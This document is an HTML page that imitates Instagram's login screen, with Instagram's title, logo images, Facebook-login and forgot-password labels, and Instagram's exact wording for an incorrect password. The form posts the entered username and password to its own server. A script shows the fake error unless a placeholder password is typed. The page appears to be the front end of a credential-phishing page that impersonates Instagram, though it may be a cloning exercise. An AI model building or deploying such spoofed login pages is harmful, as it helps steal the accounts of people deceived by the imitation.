<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* Your CSS styles */
        .error-message {
            color: rgb(237, 73, 86);
            margin: 10px 40px;
            text-align: center;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: sans-serif;
        }
        
        body {
            display: flex;
            justify-content: center;
            height: 100vh;
            align-items: center;
            gap: 40px;
        }
        
        .insta__form {
            display: flex;
            flex-direction: column;
            gap: 40px;
        }
        
        .login__form {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 40px;
        }
        
        .form {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        input {
            max-width: 400px;
            width: 300px;
            background-color: #ECF3FF;
            border: 0;
            padding: 10px 20px;
            border: 1px solid #eee;
            border-radius: 50px;
            outline: none;
            color: #666;
        }
        
        button {
            max-width: 400px;
            width: 300px;
            background-color: #3578E5;
            border: 0;
            padding: 10px 20px;
            border: 1px solid #eee;
            border-radius: 50px;
            outline: none;
            color: #fff;
            font-weight: 600;
            cursor: pointer;
        }
        
        .or {
            font-size: 14px;
            font-weight: 600;
            color: #666;
            text-align: center;
            margin-top: 20px;
            position: relative;
        }
        
        .or::before,
        .or::after {
            content: '';
            position: absolute;
            background-color: #666;
            height: 1px;
            bottom: 7px;
            width: 100px;
        }
        
        .or::before {
            left: 20px;
        }
        
        .or::after {
            right: 20px;
        }
        
        h3 {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            color: #385185;
            cursor: pointer;
        }
        
        h3 i {
            font-size: 22px;
        }
        
        .forget {
            margin-top: -20px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 12px;
            color: #385185;
            cursor: pointer;
        }
        
        @media (max-width: 764px) {
            .image__login {
                display: none;
            }
        }
    </style>
    <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
</head>
<body>
    <div class="image__login">
        <img src="instagramimg.png" alt="">
    </div>
    <div class="insta__form">
        <div class="login__form">
            <img src="instalogo.png">
            <form class="form" method="post" action="/" id="login-form">
                <input type="text" name="username" placeholder="Phone number, username, or email">
                <input type="password" name="password" placeholder="Password">
                <button type="submit">Log in</button>
                <span class="or">OR</span>
            </form>
            <h3>
                <i class='bx bxl-facebook-circle'></i>
                Log in with Facebook
            </h3>
            <!-- Error message display -->
            <p class="error-message" id="error-message"></p>
            <span class="forget">Forgot Password?</span>
        </div>
    </div>
    <script>
        document.getElementById('login-form').addEventListener('submit', function(event) {
            var username = this.querySelector('input[name="username"]').value;
            var password = this.querySelector('input[name="password"]').value;

            if (password !== 'correct_password') { // Replace 'correct_password' with your actual password
                event.preventDefault();
                var errorMessage = document.getElementById('error-message');
                errorMessage.style.display = 'block';
                errorMessage.innerText = "Sorry, your password was incorrect. Please double-check your password.";
            }
        });
    </script>
</body>
</html>
